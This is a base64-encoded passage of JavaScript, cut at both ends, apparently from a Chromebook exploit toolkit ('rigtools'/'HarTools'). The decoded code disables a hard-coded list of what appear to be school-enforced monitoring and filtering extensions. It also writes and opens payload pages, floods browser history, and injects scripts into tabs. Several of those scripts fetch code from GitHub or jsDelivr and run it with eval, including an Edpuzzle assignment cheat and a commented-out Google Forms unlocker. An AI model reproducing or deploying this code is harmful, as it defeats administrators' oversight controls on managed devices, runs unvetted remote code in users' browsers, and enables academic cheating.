pdCBmZXRjaCgKICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzL3JlZnMvaGVhZHMvbWFpbi9wYXlsb2Fkcy9pbmRleC5odG1sIgogICAgICAgICkudGhlbigocmVzKSA9PiByZXMudGV4dCgpKX08c2NyaXB0IHNyYz0iLi9oYXJ0b29scy5qcyI+PC9zY3JpcHQ+YAogICAgICAgICAgICApOwoKICAgICAgICAgICAgYXdhaXQgd3JpdGVGaWxlKAogICAgICAgICAgICAgICAgImhhcnRvb2xzLmpzIiwKICAgICAgICAgICAgICAgIGF3YWl0IGZldGNoKAogICAgICAgICAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzL3JlZnMvaGVhZHMvbWFpbi9wYXlsb2Fkcy9pbmRleC5qcyIKICAgICAgICAgICAgICAgICkudGhlbigocmVzKSA9PiByZXMudGV4dCgpKQogICAgICAgICAgICApOwoKICAgICAgICAgICAgY2hyb21lLnRhYnMuY3JlYXRlKHsKICAgICAgICAgICAgICAgIHVybAogICAgICAgICAgICB9KTsKICAgICAgICB9KSgpOwogICAgfTsKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3F1aWNrLXJtdi1ibHQiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIChhc3luYyAoKSA9PiB7CgogICAgICAgICAgICBjb25zdCBmcyA9IGF3YWl0IG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlKSB7CiAgICAgICAgICAgICAgICAgIHdlYmtpdFJlcXVlc3RGaWxlU3lzdGVtKFBFUlNJU1RFTlQsIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3QgSlMgPSBgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAgICAgICAgICAgICAgICJjZ2JiYmptZ2RwbmlmaWpjb25oYW1nZ2plaGxhbWNpZiIsCiAgICAgICAgICAgICAgICAgICAgICAibGZrYmJtY2xucGFpaHBhYWpob2hoZmRqZWxjaGtpa2YiLAogICAgICAgICAgICAgICAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAgICAgICAgICAgICAgICJwb2htZ29iZGVhamVtY2lmcG9sZG5uaGZmam5ua2hnZiIsCiAgICAgICAgICAgICAgICAgICAgICAiYmVjZHBsZmFsb29mbGFuaXBqb2JsY21wYWVra2JiaGUiLAogICAgICAgICAgICAgICAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAgICAgICAgICAgICAgICJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIsCiAgICAgICAgICAgICAgICAgICAgICAiaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiLAogICAgICAgICAgICAgICAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAgICAgICAgICAgICAgICJra2JtZGdqZ2djZGFqY2tkbGJuZ2Rqb25wY2hwYWllYSIsCiAgICAgICAgICAgICAgICAgICAgICAibmpkbmljbGdlZ2lqZGNkbGlrbGdpZWljYW5wbWNuZ2oiLAogICAgICAgICAgICAgICAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIgogICAgICAgICAgICAgICAgICAgIF07CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChpZCwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jbG9zZSgpOwogICAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBhbGVydCgidW5zdWNjZXNzZnVsIik7CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgYDsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IGZpbGVOYW1lID0gImJsb2F0IjsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZShgJHtmaWxlTmFtZX0uaHRtbGAsYDwhZG9jdHlwZWh0bWw+PHRpdGxlPmRpc2FibGluZy4uPC90aXRsZT48bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUludGVyOml0YWwsb3Bzeix3Z2h0QDAsMTQuLjMyLDEwMC4uOTAwOzEsMTQuLjMyLDEwMC4uOTAwJmRpc3BsYXk9c3dhcCJyZWw9c3R5bGVzaGVldD48c3R5bGU+cHttYXJnaW46MH1ib2R5e2JhY2tncm91bmQtY29sb3I6IzAwMDtjb2xvcjojZmZmO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWY7bWFyZ2luOjA7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO2hlaWdodDoxMDB2aH1oMTo6YmVmb3Jle2NvbnRlbnQ6IiMgIjtjb2xvcjpva2xjaCg4MS4yMSUgLjE0MDkgMTY1LjE0KTtmb250LXdlaWdodDo5MDB9LmlubmVye2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7dGV4dC1hbGlnbjpjZW50ZXJ9dGV4dGFyZWF7d2lkdGg6bWF4LWNvbnRlbnQ7cGFkZGluZy10b3A6MWVtO292ZXJmbG93LXk6aGlkZGVuO2JvcmRlci1yYWRpdXM6MTBweDtiYWNrZ3JvdW5kOm9rbGNoKDE3LjAzJSAuMDA4MyAyODUuNDkgLyAuNSk7Ym9yZGVyOjFweCBzb2xpZCBva2xjaCg2OC42NSUgLjAzNzQgMjc0LjczIC8gLjUpO2NvbG9yOm9rbGNoKDk1LjkyJSAuMDE5MjUzIDI3My4yMzc3KTtyZXNpemU6bm9uZTtmb250LWZhbWlseTptb25vc3BhY2U7dHJhbnNpdGlvbjphbGwgLjVzIGN1YmljLWJlemllciguMTc1LC44ODUsLjMyLDEuOSksY29sb3IgLjI1cyxib3JkZXItY29sb3IgLjI1c308L3N0eWxlPjxkaXYgY2xhc3M9aW5uZXI+PHRleHRhcmVhIGNvbHM9MTIgcmVhZG9ubHkgcm93cz0yPiAgKF5fX19fXik8L3RleHRhcmVhPjxoMT5kaXNhYmxpbmcuLi48L2gxPjxwPmhhcHB5IGRheXMgIHdpdGhvdXQgYmxvY2tpbmcgYW0gaSByaWdodD88L2Rpdj48c2NyaXB0IHNyYz0uLyR7ZmlsZU5hbWV9LmpzPjwvc2NyaXB0PmApOwogICAgICAgICAgICAKICAgICAgICAgICAgYXdhaXQgd3JpdGVGaWxlKGAke2ZpbGVOYW1lfS5qc2AsIEpTKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNocm9tZS50YWJzLmNyZWF0ZSh7IHVybCB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pKCk7CiAgICB9OwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI2hzdGZsZCIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgZG9jdW1lbnQudGl0bGUgPSAiVW50aXRsZWQgZG9jdW1lbnQiOwogICAgICAgIGxldCBsaW5rID0KICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcigibGlua1tyZWx+PSdpY29uJ10iKSB8fAogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7CiAgICAgICAgbGluay5yZWwgPSAiaWNvbiI7CiAgICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChsaW5rKTsKICAgICAgICBsaW5rLmhyZWYgPQogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluLyI7CgogICAgICAgIGxldCBudW0gPSBwcm9tcHQoCiAgICAgICAgICAgICJIb3cgVGltZXMgRG8gWW91IFdhbnQgVGhpcyBQYWdlIFRvIFNob3cgVXAgSW4geW91ciBIaXN0b3J5PyIKICAgICAgICApOwogICAgICAgIGxldCBkb25lID0gZmFsc2U7CiAgICAgICAgY29uc3QgeCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwogICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IG51bTsgaSsrKSB7CiAgICAgICAgICAgIGhpc3RvcnkucHVzaFN0YXRlKDAsIDAsIGkgPT09IG51bSA/IHggOiBpLnRvU3RyaW5nKCkpOwogICAgICAgICAgICBpZiAoaSA9PT0gbnVtKSBkb25lID0gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgaWYgKGRvbmUpIHsKICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAiRmxvb2RpbmcgU3VjY2Vzc2Z1bCFcbiAiICsKICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmICsKICAgICAgICAgICAgICAgICIgXG5JcyBOb3cgSW4gWW91ciBIaXN0b3J5ICIgKwogICAgICAgICAgICAgICAgbnVtICsKICAgICAgICAgICAgICAgIChudW0gPT0gMSA/ICIgdGltZS4iIDogIiBUaW1lcy4iKQogICAgICAgICAgICApOwogICAgICAgIH0KICAgIH07CgogICAgY29uc3QgVGFiQnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiN0YWJzLWJ1dHRvbnMiKTsKCiAgICBpZiAoY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCkgewoKICAgICAgICBmdW5jdGlvbiBsaXN0ZW5lckFwcChjYWxsYmFjaykgewogICAgICAgICAgICBjb25zdCBmdW5jID0gKGlkLCBjaGFuZ2VJbmZvKSA9PiB7CiAgICAgICAgICAgICAgICBpZiAoY2hhbmdlSW5mby5zdGF0dXMgPT09ICJjb21wbGV0ZSIpIHsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5nZXQoaWQsICh0YWIpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRhYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2sodGFiKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICBjaHJvbWUudGFicy5vblVwZGF0ZWQuYWRkTGlzdGVuZXIoZnVuYyk7CiAgICAgICAgICAgIHJldHVybiBmdW5jOwogICAgICAgIH0KCiAgICAgICAgY29uc3Qgc2NyaXB0cyA9IHt9OwogICAgICAgIGNvbnN0IGNvbmRpdGlvbnMgPSB7fTsKICAgICAgICBjb25zdCBsaXN0ZW5lcnMgPSB7fTsKCiAgICAgICAgc2NyaXB0cy5lcnVkYSA9IGAKICAgIGZldGNoKCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2VydWRhIikudGhlbihyZXMgPT4gcmVzLnRleHQoKSkudGhlbigoZGF0YSkgPT4gewogICAgICBldmFsKGRhdGEpOwogICAgICBpZiAoIXdpbmRvdy5lcnVkYUxvYWRlZCkgewogICAgICAgIGVydWRhLmluaXQoewogICAgICAgICAgZGVmYXVsdHM6IHsKICAgICAgICAgICAgZGlzcGxheVNpemU6IDQ1LAogICAgICAgICAgICB0aGVtZTogIkFNT0xFRCIKICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICB3aW5kb3cuZXJ1ZGFMb2FkZWQgPSB0cnVlOwogICAgICB9CiAgICB9KTsKICBgOwoKICAgICAgICBzY3JpcHRzLmNoaWkgPSBgCiAgICBjb25zdCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgIHNjcmlwdC5zcmMgPSAnaHR0cHM6Ly9jaGlpLmxpcmlsaXJpLmlvL3BsYXlncm91bmQvdGFyZ2V0LmpzJzsKICAgIHNjcmlwdC5zZXRBdHRyaWJ1dGUoJ2VtYmVkZGVkJywgJ3RydWUnKTsKICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKICBgOwoKICAgICAgICBzY3JpcHRzLmFkYmxvY2sgPSBgCiAgICAoZnVuY3Rpb24oKXsKCiAgICAgIHZhciBzZWxlY3RvcnMgPSBbCgogICAgICAnI3NpZGViYXItd3JhcCcsICcjYWR2ZXJ0JywgJyN4cmFpbCcsICcjbWlkZGxlLWFydGljbGUtYWR2ZXJ0LWNvbnRhaW5lcicsCiAgICAgICcjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsICcjYXJvdW5kLXRoZS13ZWInLCAnI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLAogICAgICAnI3RhYm9vbGEtY29udGVudCcsICcjdGFib29sYS1iZWxvdy10YWJvb2xhLW5hdGl2ZS10aHVtYm5haWxzJywgJyNpbmFydGljbGVfd3JhcHBlcl9kaXYnLAogICAgICAnI3JjLXJvdy1jb250YWluZXInLCAnI2FkcycsICcjYXQtc2hhcmUtZG9jaycsICcjYXQ0LXNoYXJlJywgJyNhdDQtZm9sbG93JywgJyNyaWdodC1hZHMtcmFpbCcsCiAgICAgICdkaXYjYWQtaW50ZXJzdGl0aWFsJywgJ2RpdiNhZHZlcnQtYXJ0aWNsZScsICdkaXYjYWMtbHJlLXBsYXllci1waCcsCgogICAgICAnLmFkJywgJy5hdmVydCcsICcuYXZlcnRfX3dyYXBwZXInLCAnLm1pZGRsZS1iYW5uZXItYWQnLCAnLmFkdmVydGlzZW1lbnQnLAogICAgICAnLkdvb2dsZUFjdGl2ZVZpZXdDbGFzcycsICcuYWR2ZXJ0JywgJy5jbnMtYWRzLXN0YWdlJywgJy50ZWFkcy1pbnJlYWQnLCAnLmFkLWJhbm5lcicsCiAgICAgICcuYWQtYW5jaG9yZWQnLCAnLmpzX3NoZWxmX2FkcycsICcuYWQtc2xvdCcsICcuYW50ZW5uYScsICcueHJhaWwtY29udGVudCcsCiAgICAgICcuYWR2ZXJ0aXNlbWVudF9fbGVhZGVyYm9hcmQnLCAnLmFkLWxlYWRlcmJvYXJkJywgJy50cmNfcmJveF9vdXRlcicsICcua3MtcmVjb21tZW5kZWQnLAogICAgICAnLmFydGljbGUtZGEnLCAnZGl2LnNwb25zb3JlZC1zdG9yaWVzLWNvbXBvbmVudCcsICdkaXYuYWRkdGhpcy1zbWFydGxheWVycycsCiAgICAgICdkaXYuYXJ0aWNsZS1hZHNwb25zb3InLCAnZGl2LnNpZ25pbi1wcm9tcHQnLCAnZGl2LmFydGljbGUtYnVtcGVyJywgJ2Rpdi52aWRlby1wbGFjZWhvbGRlcicsCiAgICAgICdkaXYudG9wLWFkLWNvbnRhaW5lcicsICdkaXYuaGVhZGVyLWFkJywgJ2Rpdi5hZC11bml0JywgJ2Rpdi5kZW1vLWJsb2NrJywgJ2Rpdi5PVVRCUkFJTicsCiAgICAgICdkaXYub2Itd2lkZ2V0JywgJ2Rpdi5ud3NybS13cmFwcGVyJywgJ2Rpdi5hbm5vdW5jZW1lbnRCYXInLCAnZGl2LnBhcnRuZXItcmVzb3VyY2VzLWJsb2NrJywKICAgICAgJ2Rpdi5hcnJvdy1kb3duJywgJ2Rpdi5tLWFkJywgJ2Rpdi5zdG9yeS1pbnRlcnJ1cHQnLCAnZGl2LnRhYm9vbGEtcmVjb21tZW5kZWQnLAogICAgICAnZGl2LmFkLWNsdXN0ZXItY29udGFpbmVyJywgJ2Rpdi5jdHgtc2lkZWJhcicsICdkaXYuaW5jb2duaXRvLW1vZGFsJywgJy5PVVRCUkFJTicsICcuc3Vic2NyaWJlLWJ1dHRvbicsCiAgICAgICcuYWRzOScsICcubGVhZGVyYm9hcmRzJywgJy5Hb29nbGVBY3RpdmVWaWV3RWxlbWVudCcsICcubXB1LWNvbnRhaW5lcicsICcuYWQtMzAweDYwMCcsICcudGYtYWQtYmxvY2snLAogICAgICAnLnNpZGViYXItYWRzLWhvbGRlci10b3AnLCAnLmFkcy1vbmUnLCAnLkZ1bGxQYWdlTW9kYWxfX3Njcm9sbGVyJywKICAgICAgJy5jb250ZW50LWFkcy1ob2xkZXInLCAnLndpZGdldC1hcmVhJywgJy5zb2NpYWwtYnV0dG9ucycsICcuYWMtcGxheWVyLXBoJywKCiAgICAgICdhc2lkZSNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywgJ2FzaWRlW3JvbGU9ImJhbm5lciJdJywgJ2FzaWRlJywKICAgICAgJ2FtcC1hZCcsICdzcGFuW2lkXj1hZF9pc19dJywgJ2RpdltjbGFzcyo9ImluZGlhbmFwb2xpcy1vcHRpbiJdJywgJ2RpdltpZF49Z29vZ2xlX2Fkc19pZnJhbWVdJywKICAgICAgJ2RpdltkYXRhLWdvb2dsZS1xdWVyeS1pZF0nLCAnc2VjdGlvbltkYXRhLXJlc3BvbnNlXScsICdpbnMuYWRzYnlnb29nbGUnLCAnZGl2W2RhdGEtZ29vZ2xlLXF1ZXJ5LWlkXScsCiAgICAgICdkaXZbZGF0YS10ZXN0LWlkPSJmdWxsUGFnZVNpZ251cE1vZGFsIl0nLCAnZGl2W2RhdGEtdGVzdC1pZD0iZ2lmdFdyYXAiXScgXTsKICAgICAgZm9yKGxldCBpIGluIHNlbGVjdG9ycykgewogICAgICAgICAgbGV0IG5vZGVzTGlzdCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoc2VsZWN0b3JzW2ldKTsKICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCBub2Rlc0xpc3QubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICBsZXQgZWwgPSBub2Rlc0xpc3RbaV07CiAgICAgICAgICAgICAgaWYoZWwgJiYgZWwucGFyZW50Tm9kZSkKICAgICAgICAgICAgICBlbC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGVsKTsKICAgICAgICAgIH0KICAgICAgfQogICAgfSkoKTsKICBgOwogIC8qc2NyaXB0cy5nbG9ja2VkID0gYApmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hOYXN1bmkvZ29vZ2xlLWZvcm1zLXVubG9ja2VyL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHQuanMiKQogIC50aGVuKHJlc3BvbnNlID0+IHsKICAgIGlmICghcmVzcG9uc2Uub2spIHsKICAgICAgdGhyb3cgbmV3IEVycm9yKCJOZXR3b3JrIHJlc3BvbnNlIHdhcyBub3Qgb2siKTsKICAgIH0KICAgIHJldHVybiByZXNwb25zZS50ZXh0KCk7CiAgfSkKICAudGhlbihzY3JpcHRDb250ZW50ID0+IHsKICAgIGlmICghd2luZG93LnNraWJMb2FkZWQpIHsKICAgICAgZXZhbChzY3JpcHRDb250ZW50KTsKICAgICAgd2luZG93LnNraWJMb2FkZWQgPSB0cnVlOwogICAgfQogIH0pCiAgLmNhdGNoKGVycm9yID0+IGFsZXJ0KCJFcnJvciBsb2FkaW5nIHNjcmlwdDoiLCBlcnJvcikpOwpgOwoqLwogICAgICAgIHNjcmlwdHMuZWRwdXp6bGUgPSBgCiAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL01pbmVyNDl1ci9zaG9ydGhhbmRAbWFpbi9lZHB1enpsaW5nc2NyaXB0LmpzIikudGhlbihyID0+IHIudGV4dCgpKS50aGVuKHIgPT4gewogICAgICBpZiAoIXdpbmRvdy5lZHB1enpsZXNMb2FkZWQpIHsKICAgICAgICBldmFsKHIpOwogICAgICAgIHdpbmRvdy5lZHB1enpsZXNMb2FkZWQgPSB0cnVlOwogICAgICB9CiAgICB9KTsKICBgOwogICAgICAgIGNvbmRpdGlvbnMuZWRwdXp6bGUgPSAodGFiKSA9PiB0YWIudXJsLm1hdGNoKC9lZHB1enpsZVwuY29tXC9hc3NpZ25tZW50cy9nKTsKICAgICAgICAvLyBjb25kaXRpb25zLmdsb2NrZWQgPSAodGFiKSA9PiB0YWIudXJsLm1hdGNoKC9odHRwcz86XC9cL2RvY3NcLmdvb2dsZVwuY29tXC9mb3Jtc1wvL2cpOwogICAgICAgIGNvbnN0IFRvZ2dsZUJ1dHRvbnMgPSBUYWJCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVhYmxlLWJ1dHRvbnMiKTsKCiAgICAgICAgVG9nZ2xlQnV0dG9ucy5xdWVyeVNlbGVjdG9yQWxsKCJidXR0b24iKS5mb3JFYWNoKAogICAgICAgICAgICAoYikgPT4KICAgICAgICAgICAgKGIub25jbGljayA9ICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IGlkID0gYi5pZDsKCiAgICAgICAgICAgICAgICBpZiAoYi5oYXNBdHRyaWJ1dGUoInRvZ2dsZWQiKSkgewoKICAgICAgICAgICAgICAgICAgICBpZiAoaWQgaW4gbGlzdGVuZXJzKQogICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5vblVwZGF0ZWQucmVtb3ZlTGlzdGVuZXIobGlzdGVuZXJzW2lkXSk7CiAgICAgICAgICAgICAgICAgICAgYi5yZW1vdmVBdHRyaWJ1dGUoInRvZ2dsZWQiKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNjcmlwdCA9IHNjcmlwdHNbaWRdIHx8ICIiOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGNvbmRpdGlvbiA9IGNvbmRpdGlvbnNbaWRdIHx8ICgodGFiKSA9PiB0cnVlKTsKICAgICAgICAgICAgICAgICAgICBjb25zdCBmdW5jID0gbGlzdGVuZXJBcHAoKHRhYikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29uZGl0aW9uKHRhYikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQodGFiLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29kZTogc2NyaXB0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICBsaXN0ZW5lcnNbaWRdID0gZnVuYzsKCiAgICAgICAgICAgICAgICAgICAgYi5zZXRBdHRyaWJ1dGUoInRvZ2dsZWQiLCAidHJ1ZSIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KQogICAgICAgICk7CiAgICB9IGVsc2UgewogICAgICAgIFRhYkJ1dHRvbnMuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0KCiAgICBkb2N1bWVudAogICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjY29kZS1ydW4iKQogICAgICAgIC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHJ1bkNvZGUoZmFsc2UpKTsKfTsKCmNvbnN0IHJ1bkNvZGUgPSBhc3luYyAob25UYWIsIHRhYklkID0gIiIpID0+IHsKICAgIGNvbnN0IGNvZGVUZXh0YXJlYSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlIik7CiAgICBsZXQgY29kZSA9IGNvZGVUZXh0YXJlYS52YWx1ZS50cmltKCk7CgogICAgY29uc3Qgb3V0cHV0RGl2ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2NvZGUtb3V0cHV0Iik7CgogICAgaWYgKGNvZGUudG9Mb3dlckNhc2UoKSA9PT0gInByYWhpdCIpIHsKCiAgICAgICAgY29uc3QgY29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgY29udGFpbmVyLmNsYXNzTmFtZSA9ICJwcmFoaXQtY29udGFpbmVyIjsKCiAgICAgICAgY29uc3Qgb3ZlcmxheUltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgb3ZlcmxheUltYWdlLnNyYyA9CiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvcHJhaGl0LnBuZyI7CiAgICAgICAgb3ZlcmxheUltYWdlLmFsdCA9ICJQcmFoaXQgSW1hZ2UiOwogICAgICAgIG92ZXJsYXlJbWFnZS5jbGFzc05hbWUgPSAicHJhaGl0LWltYWdlIjsKCiAgICAgICAgY29uc3QgdGV4dEJveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRleHRCb3gudGV4dENvbnRlbnQgPSAiXCJJIG1hZGUgbXkgb3duIG9pbCByaWdnaW5nIHN0b2NrIG1hcmtldCB0b29scy5cIiI7CiAgICAgICAgdGV4dEJveC5jbGFzc05hbWUgPSAicHJhaGl0LXRleHRib3giOwoKICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQob3ZlcmxheUltYWdlKTsKICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dEJveCk7CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGFpbmVyKTsKCiAgICAgICAgY29uc3Qgc25vd2ZsYWtlc0RpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHNub3dmbGFrZXNEaXYuY2xhc3NOYW1lID0gInNub3dmbGFrZXMiOwogICAgICAgIHNub3dmbGFrZXNEaXYuc2V0QXR0cmlidXRlKCJhcmlhLWhpZGRlbiIsICJ0cnVlIik7CgogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgMTQ7IGkrKykgewogICAgICAgICAgICBjb25zdCBzbm93Zmxha2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgc25vd2ZsYWtlLmNsYXNzTmFtZSA9ICJzbm93Zmxha2UiOwoKICAgICAgICAgICAgY29uc3Qgc25vd2ZsYWtlSW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgICAgICAgICAgc25vd2ZsYWtlSW1hZ2Uud2lkdGggPSAzMDsKICAgICAgICAgICAgc25vd2ZsYWtlSW1hZ2Uuc3JjID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9wcmFoaXQucG5nIjsKICAgICAgICAgICAgc25vd2ZsYWtlLmFwcGVuZENoaWxkKHNub3dmbGFrZUltYWdlKTsKCiAgICAgICAgICAgIHNub3dmbGFrZXNEaXYuYXBwZW5kQ2hpbGQoc25vd2ZsYWtlKTsKICAgICAgICB9CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc25vd2ZsYWtlc0Rpdik7CgogICAgICAgIGNvbnN0IGV4cGxvc2lvbkltYWdlID0gZG9jdW1lbn